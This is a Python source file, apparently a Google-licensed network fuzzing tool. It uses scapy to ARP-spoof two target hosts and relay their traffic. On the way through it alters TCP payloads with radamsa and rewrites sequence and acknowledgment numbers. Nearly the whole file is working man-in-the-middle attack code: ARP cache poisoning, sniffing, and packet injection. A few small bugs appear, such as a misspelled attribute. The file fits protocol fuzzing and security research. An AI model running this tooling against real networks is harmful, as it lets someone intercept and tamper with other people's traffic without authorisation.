# Copyright 2017 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

#from import all as scapy
from scapy.all import *
import sys
import time
import pprint
import pdb
import random
from time import sleep
from subprocess import Popen, PIPE
import binascii

conf.verb = False
payload_dif = 0
radamsa_bin = '/usr/bin/radamsa'
FUZZ_FACTOR = 50.0

def mutate(payload):
    try:
        radamsa = [radamsa_bin, '-n', '1', '-']
        p = Popen(radamsa, stdin=PIPE, stdout=PIPE)
        mutated_data = p.communicate(payload)[0]
    except:
        print "Could not execute 'radamsa'."
        sys.exit(1)

    return mutated_data

class ARPSpoof(object):

    MAX_ARP_INTERVAL = 30
    last_ack = 0
    last_seq = 0

    def __init__(self, targets, iface=None):
        assert len(targets) == 2, "Must have 2 targets"
        self._targets = targets
        self._iface = iface
        self.stopping = False

    def start(self):
        """Setup ARP Spoofing."""
        self.log('Setting up ARP spoofing.')
        self._get_target_macs()
        self._arp_spoof()

    def _arp_spoof(self):
        """Do the packets for arp spoofing."""
        self._arp(self._targets[0], self._targets[1], self._target_macs[0])
        self._arp(self._targets[1], self._targets[0], self._target_macs[1])
        self._last_spoof = time.time()

    def shutdown(self):
        """Shutdown ARP Spoofing."""
        self.log('Shutting down arp spoofing!')
        self._arp(self._targets[0], self._targets[1], self._target_macs[0],
                self._target_macs[1])
        self._arp(self._targets[1], self._targets[0], self._target_macs[1],
                self._target_macs[0])

    def modify_packet(self, pkt):
        print "==========================================="
        print "%s:%d -> %s:%d" % (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
        print "TCP flags: 0x%x" % (pkt[TCP].flags)
        if pkt[Ether].src==self._target_macs[0]:
            pkt[Ether].src=pkt[Ether].dst
            pkt[Ether].dst=self._target_macs[1]
        elif pkt[Ether].src==self._target_macs[1]:
            pkt[Ether].src=pkt[Ether].dst
            pkt[Ether].dst=self._target_macs[0]

        """"place random delays"""
        '''
        ms = random.uniform(0.50, 0.90)
        print "sleep %f ms" % (ms*1000)
        sleep(ms)
        '''

        """mutate payload"""
        # TCP flag: PUSH
        if pkt[TCP].flags & 0x08:
            payload_before = len(pkt[TCP].payload)
            self.last_seq = pkt[TCP].seq + payload_before
            payload = str(pkt[TCP].payload)
#            print "[before payload]:" + str(payload).encode("HEX")
#            print "[before payload]:" + str(payload)
#            print "[before payload len]: %d" % payload_before
            header = payload[:5]
            payload = header + mutate(payload[5:])

#            payload = mutate(payload) # for test
#            print "[after payload]:" + str(payload).encode("HEX")
#            print "[after payload]:" + str(payload)
            pkt[TCP].payload = Raw(load=payload)
            '''
            payload = str(pkt[TCP].payload) + "sniff!\n"
            pkt[TCP].payload = Raw(load=payload)
            '''

            payload_after = len(pkt[TCP].payload)
            print "[after payload len]: %d" % payload_after
            payload_dif = payload_after - payload_before
            pkt[IP].len = pkt[IP].len + payload_dif

            if self.last_ack != 0:
                print "last_ack:" + str(self.last_ack)
                print "before seq:" + str(pkt[TCP].seq)
                pkt[TCP].seq = self.last_ack
                print "after seq:" + str(pkt[TCP].seq)
        # TCP flag: ACK
        elif (pkt[TCP].flags & 0xfff) == 0x10 and pkt[TCP].sport == 9876:
            print "last_seq:" + str(self.last_seq)
            print "before ack:" + str(pkt[TCP].ack)
            self.last_ack = pkt[TCP].ack
            pkt[TCP].ack = self.last_seq
            print "after ack:" + str(pkt[TCP].ack)

        del pkt[IP].chksum
        del pkt[TCP].chksum
        print "==========================================="
        return pkt

    def run(self):
        self.start()
        try:
            # Main loop
            bpf = ("(src host %(targeta)s and dst host %(targetb)s) or "
                    "(src host %(targetb)s and dst host %(targeta)s)")
            bpf %= {'targeta': self._targets[0], 'targetb': self._targets[1]}
            self.log('Starting sniffing.')
            sniff(store=0, filter=bpf, prn=self.handle_packet,
                    iface=self._iface)
            # sniff(store=0, filter=bpf, prn=self.handle_packet,
            #        stop_filter=self.should_stop, iface=self._iface)
        
        finally:
            # Ensure we cleanup
            self.shutdown()

    def handle_packet(self, packet):
        '''
        if len(packet) > 1500:
            print "!!!!!!!!!!!!!!!!!!pkt len:%d" % (len(packet))
            return
        '''

        if time.time() - self._last_spoof > self.MAX_ARP_INTERVAL:
            # Renew our spoofing
            self._arp_spoof()
        if not packet.haslayer(IP):
            return
        if packet[Ether].src not in self._target_macs:
            # probably came from us
            return
        packet = self.modify_packet(packet)
#        pdb.set_trace()
        packet = str(packet)
        if packet:
#            print "pkt len:%d" % (len(packet))
            if len(packet) > 1500:
#                pdb.set_trace()
                i=1
                length = len(packet)
                remain = length
                while remain > 0:
                    if remain > 1500:
                        buf = packet[i:1500+i]
                        i = i + 1500
                        remain = remain - 1500
                    else:
                        remain = remain - (length - i)
                        buf = packet[i:length]
                    sendp(buf, iface=self._iface)
            else:
                sendp(packet, iface=self._iface)

    def should_stop(self, unused_packet):
        """Should stop packet capture?"""
        return self.stoppin

    def stop(self):
        """Trigger stop after next packet."""
        self.stopping = True

    def log(self, msg, *args, **kwargs):
        """Override for other logging options."""
        if kwargs:
            msg %= kwargs
        elif args:
            msg %= args
        sys.stdout.write('[*] %s\n' % msg)
        sys.stdout.flush()

    def _get_target_macs(self):
        """Get MAC addresses for targets."""
        rv = []
        for target in self._targets:
            query = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target)
            ans, _ = srp(query, timeout=2, iface=self._iface)
            for _, rcv in ans:
                rv.append(rcv[Ether].src)
                break
        self._target_macs = rv

    def _arp(self, dstip, srcip, dstmac, srcmac=None):
        self.log('ARPing %s to %s (%s)', srcip, dstip, dstmac)
        kwargs = {
                'op': 2,
                'pdst': dstip,
                'psrc': srcip,
                'hwdst': dstmac,
                }
        if srcmac is not None:
            kwargs['hwsrc'] = srcmac
        send(ARP(**kwargs), count=50, iface=self._iface)


if __name__ == '__main__':
    if len(sys.argv) > 3:
        spoofer = ARPSpoof(sys.argv[1:3], sys.argv[3])
    else:
        spoofer = ARPSpoof(sys.argv[1:3])
    spoofer.run()
